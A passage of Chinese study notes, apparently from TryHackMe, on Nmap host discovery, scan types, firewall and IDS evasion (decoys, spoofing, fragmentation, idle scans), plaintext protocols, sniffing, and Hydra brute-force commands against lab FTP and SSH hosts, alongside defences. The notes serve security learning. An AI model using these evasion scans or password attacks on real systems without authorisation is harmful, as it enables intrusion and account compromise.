  - 如果与目标在同一个子网里才可以进行ARP扫描
  - 示例 `nmap -PR -sn MACHINE_IP/24`
    - `-PR` 表示使用ARP扫描
  - `arp-scan` 扫描器
    - 使用`arp-scan -l`，扫描本地网络的所有有效IP
    - 使用`arp-scan -I eth0 -l`，指定使用网卡接口
- 使用 ICMP 的Nmap主机发现
  - ping 目标网络的所有IP 
  - 筛选出使用ping reply (ICMP Type 0) 回复我们请求ping (ICMP Type 8/Echo) 请求的主机 
  - 使用 `nmap -PE -sn MACHINE_IP/24`
  - 大多数现代防火墙对ICMP协议进行了限制
    - `-PE` 回显请求往往被阻止
    - `-PP` 使用时间戳请求（ICMP Type 13）并检查它是否会收到时间戳回复（ICMP Type 14）
    - `-PM`使用地址掩码查询（ICMP Type 17）并检查它是否收到地址掩码回复（ICMP Type 18）
- 使用TCP 和 UDP 的 Nmap 主机发现
  - TCP SYN Ping
    - 使用`-PS`
    - `nmap -PS -sn MACHINE_IP/24`
      - 参数`-PS21-25`,将目标定为21,22,23,24,25
      - 参数`-PS80,443,8080`,将目标定为80,443,8080
  - TCP ACK Ping
    - 使用`-PA`
  - UDP Ping
    - 使用`-PU`
- 总结
  - `-n` 无DNS查询
  - `-R` 所有主机进行DNS反差
  - `-sn` 仅主机发现

### 端口扫描基础
- TCP 和 UDP 端口
  - Nmap对端口的 **6** 种状态
    - **Open**
    - **Closed**
    - **Filtered**: 无法确定，因为端口无法访问
    - **Unfiltered**: 无法确定端口是打开还是关闭，尽管端口是可访问的
    - **Open|Filtered**: 无法确定端口是打开还是过滤
    - **Closed|Filtered**: 无法决定端口是关闭还是过滤
- TCP Flags
  - TCP 标头是 TCP 段的前 24 个字节
  - TCP [Flags](https://github.com/MasterandRoot/Learn-THM/blob/main/Pre%20Security/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80.md#%E6%95%B0%E6%8D%AE%E5%8C%85packet%E5%92%8C%E5%B8%A7frame)
- TCP Connect Scan
  - TCP Connect Scan通过完成 TCP 3 次握手来工作
  - 在标准的 TCP 连接建立中，客户端发送一个设置了 SYN 标志的 TCP 数据包，如果端口打开，服务器以 SYN/ACK 响应；最后，客户端通过发送 ACK 完成 3 次握手
  - 使用 `Nmap -sT`
- TCP SYN Scan
  - SYN 扫描不需要完成TCP 3次握手
  - 相反，它会在收到服务器的响应(SYN/ACK)后断开连接。因为我们没有建立 TCP 连接，所以这减少了扫描被记录的机会
  - 使用 `Nmap -sS`
-  UDP Scan
  - UDP是一种无连接协议，因此它不需要任何握手来建立连接。
  - 我们不能保证侦听 UDP 端口的服务会响应我们的数据包。但是，如果将 UDP 数据包发送到关闭的端口，则会返回 ICMP 端口不可达错误(type 3, code 3)
  - 使用 `Nmap -sU`
- 微调端口和性能
  - 调整扫描端口
    - `-p22,80,443` 扫描22，80，443端口
    - `-p1-1023`
    - `-p-` 所有端口
    - `-F` 最常用的100个端口
    - `--top-ports 10` 最常用的10个端口
  - 扫描时间
    - 使用 `-T<0-5>`
    - Nmap 默认使用`-T3`
    - CTF中常使用`-T4`
    - 真实交战中使用`-T1`
  - 数据包发送效率
    - `--min-rate <number>`
    - `--max-rate <number>`
      - `--max-rate 10` `--max-rate=10`
  - 并发
    - `--min-parallelism <numprobes>` 
    - `--max-parallelism <numprobes>`
      - `--min-parallelism=512` 
### 高级端口扫描
- 掌握高级扫描，例如 null、FIN、Xmas 和空闲（僵尸）扫描、欺骗，以及 FW 和 IDS 规避
- TCP Null Scan, FIN Scan, and Xmas Scan
  - Null Scan
    - 使用 `-sN`
    - 空扫描依赖于没有响应来推断端口开启。所以它不能确定这些端口是打开的还是由于防火墙规则导致端口没有响应
  - FIN Scan
    - 使用 `-sF`
    - FIN 扫描也依赖于没有响应来推断端口开启
  - 圣诞 Scan
    - 使用 `-sX`
    - FIN, PSH, URG 置 1
    - 也依赖于没有响应来推断端口开启
- TCP Maimon Scan
  - 目前已经失效
  - FIN, ACK 置1
- TCP ACK, Window, and Custom Scan
  - ACK 扫描和 Window 扫描在帮助扫描**防火墙规则**方面非常有效
  - 然而，重要的是要记住，仅仅因为防火墙没有阻止特定端口，并不一定意味着服务正在侦听该端口。例如，可能需要更新防火墙规则以反映最近的服务更改
  - 因此，ACK 和 Window 扫描暴露了防火墙规则，而不是服务
  - TCP ACK扫描
    - 使用 `-sA`
    - ACK 置 1
  - Window扫描
    - 使用 `-sW`
  - Custom(自定义) 扫描
    - 使用 `--scanflags`
      - 想同时设置 SYN、RST 和 FIN，使用 `--scanflags RSTSYNFIN`
- Spoofing and Decoys(欺骗和诱饵)
  - 欺骗
    - `nmap -S SPOOFED_IP MACHINE_IP`
    ![nmap 欺骗](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/45b982d501fd26deb2b381059b16f80c.png)
    1. 攻击者向目标机器发送一个带有欺骗性源 IP 地址的数据包
    2. 目标机器回复欺骗性 IP 地址作为目的地
    3. 攻击者捕获回复以找出打开的端口  
    - 攻击者与目标机器位于同一子网时，也可以伪装MAC地址。
      - 使用 `--spoof-mac SPOOFED_MAC`
  - 诱饵
    - 欺骗仅在满足特定条件的极少数情况下有效。
    - 因此，攻击者可能会求助于使用诱饵来使其更难被精确定位
    - `nmap -D 10.10.0.1,10.10.0.2,RND,RND,ME MACHINE_IP`
      - `-D`
      - `ME` 攻击者
      - `RND` 随机
- 碎片化
  - 如何才能降低传统防火墙/IDS 检测到您的 Nmap 活动的可能性？分片。
  - `nmap -sS -p80 -f 10.20.30.144`
    - `-f` 8字节
    - `-ff` 16字节
-  Idle/Zombie Scan(空闲/僵尸扫描)
  - 欺骗需要特殊的网络设置，需要可以监控流量。
  - 正因如此，欺骗 IP 地址几乎没有用处；但是，我们可以通过空闲扫描来实现相关需求。
  - `nmap -sI ZOMBIE_IP MACHINE_IP`
    - `ZOMBIE_IP` 是空闲主机的 IP 地址
  - 步骤
    1. 触发空闲主机响应，可以记录空闲主机当前的IP ID
    2. 将 SYN 数据包发送到目标上的TCP端口。该数据包使用欺骗，欺诈IP是空闲主机（僵尸）的 IP 地址
    3. 再次触发空闲机器响应，将新的 IP ID 与之前收到的 IP ID 进行比较
  - 示例
    - 存在一台空闲的设备。
    1. 攻击者首先发送 SYN/ACK 到空闲的设备，空闲设备回复 RST, 其中存在IP ID
    2. 攻击者将发送一个 SYN 到目标机器上查看的TCP端口。
    3. 此数据包将使用空闲主机（僵尸）IP 地址作为源，会出现三种情况。
       - 在第一种情况下，TCP端口是关闭的，目标机器用 RST 数据包响应空闲主机。空闲主机无响应；因此它的 IP ID 不会增加
       - 在第二种情况下，TCP端口是打开的，目标机器用 SYN/ACK 数据包响应空闲主机。空闲 RST 数据包响应；因此它的 IP ID 增加
       - 在第三种情况下，由于防火墙规则，目标机器根本不响应。缺乏响应将导致与关闭端口相同的结果，空闲主机不会增加IP ID
    4. 最后攻击者向空闲主机发送另一个 SYN/ACK。空闲主机以 RST 数据包响应，再次将 IP ID 递增 1
    5. 攻击者需要将第一步收到的 RST 数据包的 IP ID 与第三步收到的 RST 数据包的 IP ID 进行比较。如果差异为 1，则表示目标机器上的端口已关闭或被过滤。但是，如果差异为 2，则表示目标上的端口已打开
  - 注意
    - 这种扫描称为空闲扫描，因为选择空闲主机对于扫描的准确性是必不可少的。如果“空闲主机”很忙，则所有返回的 IP ID 都将无用
- 扫描细节
  - `-v`
  - `--reason` 给出判断的端口打开的原因
### Nmap Post Port Scans
- 了解如何利用 Nmap 进行服务和操作系统检测、使用 Nmap 脚本引擎 (NSE)
- 服务检测
  - `-sV` Nmap将检测确定开放端口的服务和版本信息
    - 控制强度
      - `-sV --version-light` 强度为2
      - `-sV --version-all` 强度为9 
    - `-sV` 将强制完成 TCP 3次握手
    - `nmap -sV MACHINE_IP`
- 操作系统检测
  - `-O` 准确性不高
- 跟踪路由
  - `nmap -sS --traceroute MACHINE_IP`
- Nmap 脚本引擎(NSE)
  - Nmap 默认包含600+个脚本，`/usr/share/nmap/scripts`
  - 使用默认脚本
    - `--script=default`
    - `-sC`
    - 默认脚本
  - 使用脚本
    - `--script "SCRIPT-NAME"`
- `-A`
  - 相当于 `-sV -O -sC --traceroute`
### 协议和服务
- 介绍
  - 分析常见协议
  - `HTTP` `FTP` `POP3` `SMTP` `IMAP` `Telnet`
- Telent
  - 应用层协议，用于连接另一台设备的虚拟终端
  - 使用Telent，用户可以登陆到另一台设备并访问终端
  - 协议全程明文传输，安全性较差
  - 运行在 23 端口
- HTTP
- FTP
  - 监听在 21 端口
    - 主动模式，使用 20 端口进行数据传输
    - 被动模式，使用端口是客户端与服务器端协商决定
  - FTP 使用明文传递数据，极易受到攻击
- 电子邮件
  - 基本组件
    1. Mail Submission Agent (MSA)
    2. Mail Transfer Agent (MTA)
    3. Mail Delivery Agent (MDA)
    4. Mail User Agent (MUA)
  - 基本流程
    1. MUA --> MSA
        - 邮件用户代理 (MUA)，或简称为电子邮件客户端，有一封电子邮件要发送。MUA 连接到邮件提交代理 (MSA) 以发送其消息
        - **使用 SMTP 协议**
    2. MSA --> MTA
        - MSA 接收邮件，检查是否有任何错误，然后再将其传输到通常托管在同一服务器上的邮件传输代理 (MTA) 服务器
    3. MTA --> MTA(收件人)
        - MTA 会将电子邮件发送给收件人的 MTA。MTA 还可以充当邮件提交代理 (MSA)
        - **使用 SMTP 协议**
    4. MTA(收件人) --> MDA
        - 典型的设置将使 MTA 服务器也充当邮件投递代理 (MDA)
    5. MDA --> MUA(收件人)
        - 收件人将使用他们的电子邮件客户端从 MDA 收集电子邮件
        - **使用 POP3/IMAP 协议**
  - 常见协议
    - SMTP
    - POP3
    - IMAP
- SMTP
  - SMTP 默认侦听 25 端口
  - 主要用于与 MTA 服务器通信
  - SMTP 使用明文传输，使用基本的 Telnet 客户端连接到 SMTP 服务器并充当电子邮件客户端 (MUA) 发送消息
  ![SMTP](https://images2017.cnblogs.com/blog/1120165/201710/1120165-20171012221431465-177661745.png)
- POP3
  - 用于从 MDA 下载电子邮件的协议
  - 默认侦听 110 端口
  ![SMTP](https://images2017.cnblogs.com/blog/1120165/201710/1120165-20171012231717027-556986943.png)
  - 使用 Telnet 登录，`USER frank`和 `PASS D2xc9CgD` 进行身份验证
    - `STAT`
      - 响应 `+OK nn mm`
      - `nn` 收件箱电子邮件数量
      - `mm` 以八位字节（字节）为单位的收件箱大小
    - `LIST`
    - `RETR 1` 检索第一条消息
  - 邮件客户端 (MUA) 将连接到 POP3 服务器 (MDA)、验证并下载邮件
  - 虽然使用 POP3 协议的通信将隐藏在 UI 后面，但会发出类似的命令，如上面的 Telnet 会话
  - 根据默认设置，邮件客户端在下载邮件消息后 MDA 会将其删除
    - 如果希望从另一个邮件客户端再次下载电子邮件，可以从邮件客户端设置更改默认行为
    - 使用 POP3 通过多个客户端访问同一个邮件帐户通常不是很方便，因为会丢失已读和未读邮件
    - 要保持所有邮箱同步，我们需要考虑其他协议，例如 IMAP
- IMAP 
  - IMAP 默认侦听 143 端口
  - 明文传输
- 小结
  - 上述协议的服务器会受到不同类型的攻击
    - 嗅探攻击
    - 中间人 (MITM) 攻击
    - 密码攻击(认证攻击)
    - 漏洞
  - CIA 三要素
- 嗅探攻击
  - 嗅探攻击是指使用网络数据包捕获工具来收集有关目标的信息
  - 当协议以明文形式通信时，交换的数据可以由第三方捕获以进行分析
  - 如果数据在传输过程中未加密，则简单的网络数据包捕获可以揭示信息，例如私人消息的内容和登录凭据
    1. Tcpdump 是一个免费的开源命令行界面 (CLI) 程序，已被移植到许多操作系统上
    2. Wireshark 是一个免费的开源图形用户界面 (GUI) 程序，可用于多种操作系统，包括Linux、macOS 和 MS Windows
    3. Tshark 是 Wireshark 的 CLI 替代品
  - `tcpdump port 110 -A -i tun0`
    - `-A` ascii 格式显示捕获的数据包
- 中间人(MITM)攻击
  - `Ettercap`
  - **`Bettercap`**
- 传输层安全(TLS)
  - 一种标准解决方案来保证数据包的机密性和完整性。
  - 以下方法可以防止密码嗅探和MITM攻击
    - SSL（安全套接字层）
    - TLS（传输层安全）
  - 实际上 TLS 已经取代了 SSL,但术语 SSL 仍在广泛使用
  - 但是，我们可以期待所有服务器都使用 TLS
    | 协议 | 默认端口 | 安全协议 | 使用 TLS 的默认端口 |
    |------|----------|----------|---------------------|
    | HTTP |    80    |   HTTPS  |         443         |
    |  FTP |    21    |   FTPS   |         990         |
    | SMTP |    25    |   SMTPS  |         465         |
    | POP3 |    110   |   POP3S  |         995         |
    | IMAP |    143   |   IMAPS  |         993         |
  - 以 HTTPS 为例
    - 基本的 HTTP
      1. 与远程 Web 服务器建立TCP连接
      2. 向Web服务器发送HTTP请求，如 `GET`
    - HTTPS
      - 需要有额外的步骤
      - 在建立 TCP 连接之后和发送 HTTP 请求之前
      1. 建立TCP连接
      2. **建立 SSL/TLS 连接**
      3. 向Web服务器发送HTTP请求
      - 建立 SSL/TLS 连接
        1. 客户端向服务器发送 ClientHello 以表明自身功能状态，例如支持的算法
        2. 服务器用 ServerHello 响应，指示选定的连接参数
        3. 发送 ServerHelloDone 消息以指示协商已完成。它可能会在其 ServerKeyExchange 消息中发送生成主密钥所需的其他信息
        4. 客户端响应 ClientKeyExchange，其中包含生成主密钥所需的附加信息。此外，它切换到使用加密并使用 ChangeCipherSpec 消息通知服务器
        5. 服务器也切换为使用加密并在 ChangeCipherSpec 消息中通知客户端
        ![SSL/TLS](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/ea654470ae699d10e9c07bd11a8320ac.png)
- Secure Shell (SSH)
  - 注：tryhackme 的 SSH 可能要调整 VPN 的 mtu
  - SCP 基于SSH的文件传输
    - `scp mark@IP:/home/mark/archive.tar.gz ~` 下载文件到本地
    - `scp backup.tar.bz2 mark@IP:/home/mark/`  上传文件到远程
- 密码攻击
  - `hydra -l username -P wordlist.txt server service`
  - 举例
    - `hydra -l mark -P /usr/share/wordlists/rockyou.txt 10.10.108.78 ftp`
    - `hydra -l mark -P /usr/share/wordlists/rockyou.txt 10.10.108.78 ftp`
    - `hydra -l frank -P /usr/share/wordlists/rockyou.txt 10.10.108.78 ssh`
  - 可选参数
    - `-s` 选择非默认端口
    - `-t` 并发数
  - 抵御策略
    - 密码策略：对用户设置的密码实施最低复杂性限制
    - 帐户锁定：在一定次数的失败尝试后锁定帐户
    - 限制身份验证尝试：延迟对登录尝试的响应。对于知道密码的人来说，几秒钟的延迟是可以容忍的，但它们会严重阻碍自动化工具
    - 使用验证码：需要解决机器难以解决的问题。如果登录页面是通过图形用户界面 (GUI) 进行的，则效果很好
    - 要求使用公共证书进行身份验证。例如，这种方法适用于 SSH。
    - 双因素身份验证：要求用户提供可通过其他方式获得的代码，例如电子邮件、智能手机应用程序或短信。
    - 还有许多其他方法更复杂或可能需要一些关于用户的既定知识，例如基于 IP 的地理定位。
### 实践补充
- Telnet
  - `Telnet IP 80`
    - `GET / HTTP/1.1`
    - `host:/*hostname*/`










